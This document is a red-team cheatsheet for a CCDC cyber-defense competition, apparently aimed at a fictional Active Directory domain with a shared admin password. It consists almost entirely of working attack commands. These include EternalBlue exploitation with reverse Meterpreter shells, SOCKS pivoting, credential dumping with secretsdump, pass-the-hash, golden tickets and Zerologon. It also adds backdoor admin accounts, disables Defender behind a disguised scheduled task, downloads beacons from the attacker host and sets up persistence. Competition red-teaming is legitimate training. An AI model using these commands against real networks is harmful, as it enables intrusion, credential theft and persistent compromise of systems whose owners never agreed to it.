# CCDC Red Team Cheatsheet

Quick-reference commands for when scripts fail or you need to do things manually. Replace `<T>` with team number, `<IP>` with target.

---

## Environment Quick Ref

```
Domain:   aperturesciencelabs.org
DC:       192.168.20<T>.140 (ext)  /  172.16.3.140 (int)
Password: Th3cake1salie!
DA users: Administrator, caroline, cave, chell, glados, wheatley
```

| Host | Ext Octet | Internal IP | OS |
|------|-----------|-------------|-----|
| curiosity | .140 | 172.16.3.140 | Server 2016 (DC) |
| morality | .10 | 172.16.1.10 | Server 2016 |
| intelligence | .11 | 172.16.1.11 | Server 2019 |
| anger | .70 | 172.16.2.70 | Server 2019 |
| fact | .71 | 172.16.2.71 | Server 2022 |
| space | .141 | 172.16.3.141 | Windows 10 |
| adventure | .72 | 172.16.2.72 | Windows XP |

---

## Proxychains Setup (Manual)

### Option A: Meterpreter Pivot (via Adventure XP — EternalBlue)

**1. Exploit with Metasploit:**
```bash
msfconsole -q
use windows/smb/ms17_010_psexec
set RHOSTS 192.168.20<T>.72
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4445
exploit -j -z
```

**2. Set up autoroute + SOCKS on the Meterpreter session:**
```bash
# In msfconsole, after getting a session:
sessions -i 1
run post/multi/manage/autoroute SUBNET=172.16.0.0 NETMASK=255.255.0.0
background

# Start SOCKS proxy
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 127.0.0.1
set SRVPORT 109<T>
run -j
```

**3. Write proxychains config:**
```bash
cat > /tmp/proxychains_team<T>.conf << 'EOF'
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 109<T>
EOF
```

**4. Use it:**
```bash
proxychains4 -q -f /tmp/proxychains_team<T>.conf netexec smb 172.16.3.140 -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org
```

---

### Option B: Sliver SOCKS5 Pivot (via DC Beacon)

**1. In Sliver console, select the DC beacon and start SOCKS:**
```
use <beacon_id>
socks5 start --bind 0.0.0.0:108<T>
```

**2. Write proxychains config:**
```bash
cat > /tmp/proxychains_team<T>.conf << 'EOF'
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 108<T>
EOF
```

**3. Use it:**
```bash
proxychains4 -q -f /tmp/proxychains_team<T>.conf <command>
```

---

### Option C: SSH SOCKS Pivot (if you have SSH creds on any box)

```bash
# Dynamic port forward through any compromised host
ssh -D 1080 -N -f Administrator@192.168.20<T>.140

# Or through proxychains to chain pivots
proxychains4 -q -f /tmp/proxychains_team<T>.conf ssh -D 1070 -N -f Administrator@172.16.2.70
```

---

### Option D: chisel (if nothing else works)

**Attacker (server):**
```bash
chisel server --reverse --port 8443
```

**Target (client — upload and run):**
```cmd
chisel.exe client <YOUR_IP>:8443 R:socks
```

Proxychains config → `socks5 127.0.0.1 1080`

---

### Proxychains Tips & Aliases

```bash
# Quick alias setup
alias pc<T>="proxychains4 -q -f /tmp/proxychains_team<T>.conf"

# Verify proxy is working
pc<T> curl -s http://172.16.3.140 -o /dev/null -w "%{http_code}"

# Check if SOCKS port is listening
ss -tlnp | grep '108\|109'

# Edit system proxychains config (if not using per-team configs)
sudo nano /etc/proxychains4.conf
# → comment out default, add: socks5 127.0.0.1 108<T>
```

---

## Proxychains + Our Scripts

All our scripts support `-x` for internal IPs. Wrap with proxychains:

```bash
# Spray internal network
proxychains4 -q -f /tmp/proxychains_team<T>.conf spray <T> -x

# Exec on internal host
proxychains4 -q -f /tmp/proxychains_team<T>.conf exec <T> -x curiosity -c "whoami"

# Plant C2 on internal hosts
proxychains4 -q -f /tmp/proxychains_team<T>.conf planter <T> -x

# Forge with internal IPs
proxychains4 -q -f /tmp/proxychains_team<T>.conf forgegold -x <T>
```

---

## Netexec (Manual Auth Commands)

```bash
# SMB auth check
netexec smb <IP> -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org

# Pass-the-hash
netexec smb <IP> -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:<NTLM>' -d aperturesciencelabs.org

# Kerberos (golden ticket)
export KRB5CCNAME=team<T>.ccache
netexec smb <IP> -u chell --use-kcache -d aperturesciencelabs.org

# Execute command
netexec smb <IP> -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org -x "whoami /all"

# PowerShell command (WinRM)
netexec winrm <IP> -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org -X "Get-Process"

# Sweep all hosts
netexec smb 192.168.20<T>.140 192.168.20<T>.10 192.168.20<T>.11 192.168.20<T>.70 192.168.20<T>.71 192.168.20<T>.141 192.168.20<T>.72 -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org --continue-on-success
```

---

## Impacket (Manual Commands)

```bash
# secretsdump (dump all hashes)
impacket-secretsdump aperturesciencelabs.org/Administrator:'Th3cake1salie!'@192.168.20<T>.140

# secretsdump with hash
impacket-secretsdump aperturesciencelabs.org/Administrator@192.168.20<T>.140 -hashes 'aad3b435b51404eeaad3b435b51404ee:<NTLM>'

# secretsdump with kerberos
export KRB5CCNAME=team<T>.ccache
impacket-secretsdump aperturesciencelabs.org/chell@curiosity.aperturesciencelabs.org -k -no-pass -dc-ip 192.168.20<T>.140

# smbexec shell
impacket-smbexec aperturesciencelabs.org/Administrator:'Th3cake1salie!'@192.168.20<T>.140

# psexec shell (SYSTEM)
impacket-psexec aperturesciencelabs.org/Administrator:'Th3cake1salie!'@192.168.20<T>.140

# wmiexec shell
impacket-wmiexec aperturesciencelabs.org/Administrator:'Th3cake1salie!'@192.168.20<T>.140

# Golden ticket forge (manual)
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <SID> -domain aperturesciencelabs.org chell
export KRB5CCNAME=chell.ccache

# lookupsid (get domain SID)
impacket-lookupsid aperturesciencelabs.org/Administrator:'Th3cake1salie!'@192.168.20<T>.140
```

---

## Evil-WinRM

```bash
# Password auth
evil-winrm -i <IP> -u Administrator -p 'Th3cake1salie!'

# Hash auth
evil-winrm -i <IP> -u Administrator -H '<NTLM>'

# Kerberos
evil-winrm -i curiosity.aperturesciencelabs.org -r aperturesciencelabs.org

# Upload file
evil-winrm -i <IP> -u Administrator -p 'Th3cake1salie!' -e .
# then in shell: upload beacon.exe
```

---

## RDP

```bash
xfreerdp /v:<IP> /u:Administrator /p:'Th3cake1salie!' /d:aperturesciencelabs.org /cert-ignore /dynamic-resolution

# With hash
xfreerdp /v:<IP> /u:Administrator /pth:<NTLM> /d:aperturesciencelabs.org /cert-ignore
```

---

## User/Group Management

```bash
# Add domain user
exec <T> curiosity -c "net user johnson Th3cake1salie! /add /domain"

# Add to Enterprise Admins
exec <T> curiosity -c "net group \"Enterprise Admins\" johnson /add /domain"

# Add to Domain Admins
exec <T> curiosity -c "net group \"Domain Admins\" johnson /add /domain"

# Add local admin
exec <T> <host> -c "net user longfall Th3cake1salie! /add && net localgroup Administrators longfall /add"

# Check who's in Domain Admins
exec <T> curiosity -c "net group \"Domain Admins\" /domain"

# Check local admins
exec <T> <host> -c "net localgroup Administrators"
```

---

## Disable Defender

```bash
# Scheduled task (persists across reboots, runs every minute)
exec <T> <host> -c "schtasks /create /tn \"Send Splunk Logs\" /sc minute /mo 1 /tr \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \\\"Set-MpPreference -DisableRealtimeMonitoring \$true\\\"\" /ru SYSTEM /f"

# One-shot disable (requires SYSTEM or admin PS)
exec <T> <host> -c "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring \$true\""

# Also disable other protections
exec <T> <host> -c "powershell -c \"Set-MpPreference -DisableBehaviorMonitoring \$true; Set-MpPreference -DisableBlockAtFirstSeen \$true; Set-MpPreference -DisableIOAVProtection \$true; Set-MpPreference -DisableScriptScanning \$true\""
```

---

## Firewall Rules

```bash
# Block a port (inbound)
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Block <PORT> In\" dir=in action=block protocol=tcp localport=<PORT>"

# Block a port (outbound)
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Block <PORT> Out\" dir=out action=block protocol=tcp localport=<PORT>"

# Block multiple ports at once
exec <T> <host> -c "for %p in (3389 5985 5986 8089 9997) do netsh advfirewall firewall add rule name=\"Block %p In\" dir=in action=block protocol=tcp localport=%p"

# Remove a rule
exec <T> <host> -c "netsh advfirewall firewall delete rule name=\"Block <PORT> In\""

# Nuclear: block all, allow only our C2 + SMB
exec <T> <host> -c "netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound"
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Allow SMB\" dir=in action=allow protocol=tcp localport=445"
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Allow C2 Out\" dir=out action=allow protocol=tcp remoteport=8888"
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Allow DNS Out\" dir=out action=allow protocol=udp remoteport=53"

# List all firewall rules
exec <T> <host> -c "netsh advfirewall firewall show rule name=all"

# Disable firewall entirely (noisy)
exec <T> <host> -c "netsh advfirewall set allprofiles state off"
```

---

## File Transfer (Manual)

```bash
# certutil download (Windows)
exec <T> <host> -c "certutil -urlcache -split -f http://<YOUR_IP>:8080/beacon.exe C:\Windows\Temp\svc.exe"

# PowerShell IWR
exec <T> <host> -c "powershell -c \"IWR -Uri 'http://<YOUR_IP>:8080/beacon.exe' -OutFile 'C:\Windows\Temp\svc.exe'\""

# curl.exe (Win 10+)
exec <T> <host> -c "curl.exe -o C:\Windows\Temp\svc.exe http://<YOUR_IP>:8080/beacon.exe"

# SMB copy (from attacker share)
# Start share: impacket-smbserver share . -smb2support
exec <T> <host> -c "copy \\\\<YOUR_IP>\\share\\beacon.exe C:\\Windows\\Temp\\svc.exe"

# SCP
sshpass -p 'Th3cake1salie!' scp beacon.exe Administrator@192.168.20<T>.140:"C:/Windows/Temp/svc.exe"

# Start a quick HTTP server (on attacker)
python3 -m http.server 8080
```

---

## Execution (Manual)

```bash
# Start binary in background (cmd)
exec <T> <host> -c "start /b C:\Windows\Temp\svc.exe"

# Start binary hidden (PowerShell)
exec <T> <host> -c "powershell -c \"Start-Process 'C:\Windows\Temp\svc.exe' -WindowStyle Hidden\""

# Scheduled task for persistence
exec <T> <host> -c "schtasks /create /tn \"WindowsUpdate\" /sc onstart /tr \"C:\Windows\Temp\svc.exe\" /ru SYSTEM /f"

# Run at next boot via registry
exec <T> <host> -c "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d C:\Windows\Temp\svc.exe /f"
```

---

## Zerologon (Manual)

```bash
# Exploit
python3 cve-2020-1472-exploit.py CURIOSITY 192.168.20<T>.140

# Dump with zeroed machine account
impacket-secretsdump -no-pass -just-dc aperturesciencelabs.org/'CURIOSITY$'@192.168.20<T>.140
```

---

## Recon / Enumeration

```bash
# List domain users
exec <T> curiosity -c "net user /domain"

# List domain groups
exec <T> curiosity -c "net group /domain"

# Check IP config
exec <T> <host> -c "ipconfig /all"

# List running processes
exec <T> <host> -c "tasklist"

# List services
exec <T> <host> -c "sc query state=all"

# Check scheduled tasks
exec <T> <host> -c "schtasks /query /fo LIST /v"

# Check if Defender is running
exec <T> <host> -c "powershell -c \"Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled\""
```

---

## Port Reference

| Port | Service | Protocol Used |
|------|---------|---------------|
| 22 | SSH | netexec ssh / sshpass |
| 135 | WMI | netexec wmi |
| 445 | SMB | netexec smb / impacket |
| 3389 | RDP | xfreerdp / hydra |
| 5985 | WinRM | netexec winrm / evil-winrm |
| 5986 | WinRM (HTTPS) | evil-winrm |
| 8888 | Sliver mTLS | C2 callback (default) |
| 108\<T\> | Sliver SOCKS5 | pivot.sh |
| 109\<T\> | Meterpreter SOCKS5 | ligo.sh |
